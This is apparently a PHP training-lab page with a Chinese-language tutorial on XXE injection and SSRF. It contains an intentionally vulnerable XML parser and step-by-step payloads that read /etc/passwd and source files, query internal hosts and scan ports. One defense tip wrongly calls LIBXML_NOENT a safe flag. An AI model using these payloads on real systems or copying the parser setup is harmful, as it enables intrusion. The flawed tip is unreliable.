<?php
header("Content-Type: text/html; charset=utf-8");

$result = '';
$raw_xml = '';
$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['xml'])) {
    $raw_xml = $_POST['xml'];

    // 故意關閉安全限制，模擬有漏洞的 XML 解析器
    libxml_disable_entity_loader(false);
    libxml_use_internal_errors(true);

    $dom = new DOMDocument();
    $dom->loadXML($raw_xml, LIBXML_NOENT | LIBXML_DTDLOAD);

    $xml_errors = libxml_get_errors();
    libxml_clear_errors();

    if (!empty($xml_errors)) {
        foreach ($xml_errors as $e) {
            $error .= htmlspecialchars($e->message) . "<br>";
        }
    } else {
        $result = $dom->textContent;
    }
}
?>

<h2>💉 XXE Injection → SSRF 攻擊測試</h2>

<form method="post">
  <label><strong>輸入 XML：</strong></label><br>
  <textarea name="xml" rows="10" cols="80" placeholder="貼上 XML payload..."><?= htmlspecialchars($raw_xml) ?></textarea><br><br>
  <input type="submit" value="送出 XML">
</form>

<?php if ($error): ?>
  <p style="color:red;"><strong>❌ XML 解析錯誤：</strong><br><?= $error ?></p>
<?php endif; ?>

<?php if ($result !== ''): ?>
  <h3>解析結果：</h3>
  <pre style="background:#f4f4f4;padding:10px;border:1px solid #ccc;"><?= htmlspecialchars($result) ?></pre>
<?php endif; ?>

<hr>
<h3>💡 XXE → SSRF 攻擊教學</h3>

<h4>什麼是 XXE？</h4>
<p>XXE（XML External Entity）是針對解析 XML 的應用程式的漏洞。當 XML 解析器允許載入外部實體（External Entity）時，攻擊者可透過定義惡意實體來：</p>
<ul>
  <li>讀取伺服器本地檔案</li>
  <li>發起 SSRF（Server-Side Request Forgery）向內部服務發送請求</li>
  <li>洩漏敏感資料或探測內網</li>
</ul>

<h4>Step 1 — 基本 XXE 測試</h4>
<p>確認解析器是否允許外部實體：</p>
<pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY test "XXE works!"&gt; ]&gt;
&lt;data&gt;&amp;test;&lt;/data&gt;</pre>
<p>若頁面顯示 <code>XXE works!</code>，代表實體有被解析。</p>

<h4>Step 2 — 讀取本地檔案</h4>
<p>使用 <code>SYSTEM</code> 關鍵字引入本地檔案路徑：</p>
<pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
&lt;data&gt;&amp;xxe;&lt;/data&gt;</pre>
<pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///var/www/html/login.php"&gt; ]&gt;
&lt;data&gt;&amp;xxe;&lt;/data&gt;</pre>

<h4>Step 3 — 利用 XXE 執行 SSRF</h4>
<p>將 <code>SYSTEM</code> 指向 HTTP URL，伺服器將向該位址發起請求，可用於探測內部服務：</p>
<pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"&gt; ]&gt;
&lt;data&gt;&amp;xxe;&lt;/data&gt;</pre>

<p>在本 Lab 的 Docker 環境中，可嘗試向其他 container 發起請求：</p>
<pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://db:3306/"&gt; ]&gt;
&lt;data&gt;&amp;xxe;&lt;/data&gt;</pre>

<pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://phpmyadmin:80/"&gt; ]&gt;
&lt;data&gt;&amp;xxe;&lt;/data&gt;</pre>

<pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://127.0.0.1:80/"&gt; ]&gt;
&lt;data&gt;&amp;xxe;&lt;/data&gt;</pre>

<h4>Step 4 — 探測內網 Port（Port Scanning via SSRF）</h4>
<p>透過回應時間或錯誤訊息差異，可用來掃描內部主機開放的 Port：</p>
<pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://192.168.1.1:22/"&gt; ]&gt;
&lt;data&gt;&amp;xxe;&lt;/data&gt;</pre>

<h4>防禦方式</h4>
<ul>
  <li>停用外部實體解析：PHP 中使用 <code>libxml_disable_entity_loader(true)</code></li>
  <li>使用不解析 DTD 的安全 flag：<code>LIBXML_NONET | LIBXML_NOENT</code> 搭配禁用實體</li>
  <li>避免直接解析用戶輸入的 XML，改用 JSON 等格式</li>
  <li>WAF 過濾 <code>DOCTYPE</code>、<code>ENTITY</code>、<code>SYSTEM</code> 關鍵字</li>
</ul>

<p><a href="index.php">← 回到總覽</a></p>
